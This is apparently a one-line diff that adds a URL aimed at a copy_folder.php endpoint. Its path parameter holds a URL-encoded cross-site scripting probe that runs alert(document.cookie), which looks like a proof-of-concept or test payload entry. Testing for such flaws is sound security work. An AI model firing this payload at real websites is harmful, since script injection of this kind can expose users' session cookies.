@@ -1,0 +1,1 @@
+https://www.example.com/path/copy_folder.php?path=SITE/%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
